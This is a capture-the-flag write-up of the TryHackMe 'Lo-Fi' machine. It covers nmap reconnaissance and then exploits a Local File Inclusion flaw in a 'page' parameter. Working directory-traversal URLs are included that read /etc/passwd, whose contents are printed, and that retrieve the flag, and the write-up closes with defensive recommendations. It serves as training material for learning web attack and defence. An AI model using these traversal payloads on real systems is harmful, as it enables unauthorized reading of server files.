# Lo-Fi CTF Challenge

## Executive Summary

This report details the penetration testing of the "Lo-Fi" machine on TryHackMe, classified as an Easy difficulty challenge. The objective was to identify vulnerabilities and capture the flag through systematic reconnaissance, enumeration, and exploitation. The primary vulnerability exploited was a Local File Inclusion (LFI) in the web application, allowing unauthorized access to sensitive files including the flag.

**Key Findings:**
- Open ports: 22 (SSH) and 80 (HTTP)
- Web application vulnerable to LFI via the `page` parameter
- Flag captured: `flag{******************}`

## Methodology

The assessment followed a structured offensive security methodology:
1. **Reconnaissance**: Network scanning to identify open ports and services.
2. **Enumeration**: Detailed analysis of web application structure and potential vulnerabilities.
3. **Exploitation**: Leveraging identified vulnerabilities to access restricted files.
4. **Post-Exploitation**: Flag capture and documentation.

## Reconnaissance

### NMAP Scan

Initial reconnaissance was performed using NMAP to identify open ports and running services.

**Command Executed:**
```bash
nmap -sC -sV 10.201.95.0 -oN nmap_report
```

**Results:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 18:29 WIB
Nmap scan report for 10.201.95.0
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ba:ad:98:17:00:6a:ab:c4:9b:28:c8:b1:dd:bb:52:41 (RSA)
|_  256 c2:59:8b:a9:f3:85:ff:32:e5:1f:78:b1:0b:94:55:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Lo-Fi Music
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.12 seconds
```

**Analysis:**
- Port 22: OpenSSH 8.2p1 running on Ubuntu Linux
- Port 80: Apache HTTP Server 2.2.22 with title "Lo-Fi Music"
- Operating System: Ubuntu Linux
- Total scan time: 129.12 seconds

## Enumeration

### Web Application Analysis

The web application was accessed via HTTP on port 80. Initial inspection revealed a simple lo-fi music themed site.

**Step 1: View Page Source**
To understand the application structure, the HTML source was examined.

**Command/Action:**
- Open browser and navigate to `http://10.201.95.0/`
- View page source (Ctrl+U or right-click > View Page Source)

**Key Findings:**
```html
<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>
```

The application uses a `page` parameter to include different PHP files, indicating potential for Local File Inclusion (LFI) vulnerabilities.

**Step 2: Test for LFI Vulnerability**
Attempted to access sensitive system files using directory traversal.

**Test 1: Access /etc/passwd**
URL: `http://10.201.95.0/?page=../../../../etc/passwd`

**Result:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```

**Analysis:** Successful LFI exploitation confirmed. The application includes files without proper sanitization.

## Exploitation

### Flag Capture

With LFI confirmed, attempted to access the flag file.

**URL:** `http://10.201.95.0/?page=../../../../flag.txt`

**Result:**
```
flag{*************************}
```

**Analysis:** Flag successfully captured using directory traversal in the LFI vulnerability.

## Conclusion

The Lo-Fi CTF challenge was successfully completed by exploiting a Local File Inclusion vulnerability in the web application. The vulnerability allowed unauthorized access to system files and the flag. This highlights the importance of proper input validation and sanitization in web applications to prevent such attacks.

**Recommendations:**
- Implement proper input validation for file inclusion parameters
- Use whitelisting for allowed file paths
- Regularly update web server software (Apache 2.2.22 is outdated)
- Consider using frameworks with built-in security features

## Tools Used

- NMAP: Network scanning and service enumeration
- Web Browser: Manual enumeration and exploitation
- Text Editor: Documentation

## Lessons Learned

- Always test for common web vulnerabilities like LFI when encountering dynamic file inclusion
- Directory traversal techniques are effective against poorly sanitized inputs
- Thorough enumeration is crucial for identifying exploitation vectors
- Documentation of steps aids in reproducibility and learning
